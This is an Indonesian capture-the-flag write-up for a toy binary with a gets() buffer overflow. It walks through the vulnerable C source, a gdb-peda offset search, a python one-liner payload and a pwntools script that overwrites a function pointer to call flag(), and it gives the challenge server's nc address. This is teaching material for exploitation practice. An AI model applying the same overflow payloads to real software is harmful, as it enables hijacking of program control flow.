Lompat lompat terus melompat, terus melompat, terus melompat...

```bash
nc  103.157.96.13 5771
```
Download : https://mega.nz/#!Bt5CwTaL!nE-zv5XYfBnOTGoNNKsYSkl2SRBl7nh-TtqiDAPsRz0

#### Source

```c
#include <stdio.h>

void flag() {
	printf("Here is your flag : CTFR{REDACTED}");
}

int main() {
    int (*target)();
    char buff[32];
    gets(buff);

    if (target) {
    	printf("You almost there, now you need go to function flag() :D\n");
    	target();
    }

    return 0;
}
```

```bash
$ file chal3
chal3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=581558dbd6ccfa4af8e5663832dcec4fb6744e85, with debug_info, not stripped
```

Dari sourcenya, harus mengoveride variable `target` dengan alamat fungsi `void flag()`, cari dulu buffer offsetnya 

```asm
0x000000000040058f <+0>:     push   rbp
0x0000000000400590 <+1>:     mov    rbp,rsp
0x0000000000400593 <+4>:     sub    rsp,0x30
0x0000000000400597 <+8>:     lea    rax,[rbp-0x30]
0x000000000040059b <+12>:    mov    rdi,rax
0x000000000040059e <+15>:    mov    eax,0x0
0x00000000004005a3 <+20>:    call   0x400480 <gets@plt>
0x00000000004005a8 <+25>:    cmp    QWORD PTR [rbp-0x8],0x0
0x00000000004005ad <+30>:    je     0x4005c6 <main+55>
0x00000000004005af <+32>:    lea    rdi,[rip+0xca]        # 0x400680
0x00000000004005b6 <+39>:    call   0x400460 <puts@plt>
0x00000000004005bb <+44>:    mov    rdx,QWORD PTR [rbp-0x8]
0x00000000004005bf <+48>:    mov    eax,0x0
0x00000000004005c4 <+53>:    call   rdx
0x00000000004005c6 <+55>:    mov    eax,0x0
0x00000000004005cb <+60>:    leave  
0x00000000004005cc <+61>:    ret 
```

dari kode assembler, yang harus di override ada pada` <main+53> call   rdx` jadi set breakpoint dialamat itu untuk memeriksa apa sudah kereplace valuenya atau belum

```bash
gdb-peda$ b *main+53
gdb-peda$ pattern create 48
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAA'
gdb-peda$ r
gdb-peda$ pattern search
RDX+0 found at offset: 39
No register points to pattern buffer
Pattern buffer found at:
0x006022a1 : offset    0 - size   48 ([heap])
0x00007fffffffdabf : offset   32 - size   16 ($sp + -0x2b1 [-173 dwords])
0x00007fffffffdad0 : offset   17 - size   16 ($sp + -0x2a0 [-168 dwords])
0x00007fffffffdd71 : offset    0 - size   48 ($sp + 0x1 [0 dwords])
0x00007fffffffe238 : offset    0 - size   48 ($sp + 0x4c8 [306 dwords])
References to pattern buffer found at:
0x00007fffffffd9d8 : 0x006022a1 ($sp + -0x398 [-230 dwords])
0x00007fffffffdea0 : 0x00007fffffffe238 ($sp + 0x130 [76 dwords])
gdb-peda$ x/gx $rdx
0x4146414130414161:     Cannot access memory at address 0x4146414130414161
```

setelah di cari offset ada di `RDX+0 found at offset: 39` memberikan input sepanjang `0x30` atau `48` karakter berhasil mengoveride variable `target()` dibuktikan dengan ketika di cek nilai register `$rdx` ada pesan ` Cannot access memory at address 0x4146414130414161` artinya aplikasi tidak bisa memanggil fungsi yang ada di alamat `0x4146414130414161` = `aAA0AAFA` yang merupakan pattern input sebelumnya, selanjutnya cukup mengganti alamatnya menjadi alamat dari fungsi `flag()` dalam bentuk little endian. karena sistemnya 64 bit, jadi offset menjadi 40 karena 39 belum mengisi penuh `char buff[32]` jadi payloadnya

```bash
$ python2 -c "print 'A' * 40 + '\x77\x05\x40\x00\x00\x00\x00\x00\x0a'" | ./chal3
You almost there, now you need go to function flag() :D
Here is your flag : CTFR{REDACTED} 
```

kalo dengan pawntool jadinya

```python
from pwn import *

flag_addr = p64(0x400577);
padding = 'A' * 40 + flag_addr

r = remote('localhost', 5555)
#r = process('./chal3')
r.sendline(padding)
res = r.recvall()
print res
```

jika dijalankan hasilnya

```bash
$ python2 solve.py
[+] Opening connection to localhost on port 5555: Done
[+] Receiving all data: Done (147B)
[*] Closed connection to localhost port 5555
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw^E@^@^@^@^@^@
You almost there, now you need go to function flag() :D
Here is your flag : CTFR{REDACTED}
```